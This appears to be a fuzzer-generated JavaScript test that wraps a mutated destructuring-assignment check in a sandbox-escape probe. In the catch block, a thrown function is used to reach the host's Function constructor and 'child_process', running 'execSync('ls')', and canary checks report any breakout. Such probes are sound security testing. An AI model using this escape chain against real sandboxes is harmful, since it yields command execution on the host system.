try {
    var log = [];
    function source() {
        let REPLACER = 23;
        log.push('source');
        var iterator = {
            next: function () {
                throw () => {
                    return () => {
                    };
                };
                log.push('iterator-step');
                return {
                    get done() {
                        log.push('iterator-done');
                        return true;
                    },
                    get value() {
                        log.push('iterator-value');
                    }
                };
            }
        };
        var source = {};
        source[Symbol.iterator] = function () {
            log.push('iterator');
            return iterator;
        };
        return source;
    }
    function target() {
        log.push('target');
        return target = {
            set q(v) {
                log.push('set');
            }
        };
    }
    function targetKey() {
        log.push('target-key');
        return {
            toString: function () {
                log.push('target-key-tostring');
                return 'q';
            }
        };
    }
    [target()[targetKey()]] = source();
    assert.compareArray(log, [
        'source',
        'iterator',
        'target',
        'target-key',
        'target-key-tostring',
        'iterator-step',
        'iterator-done',
        'set'
    ]);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}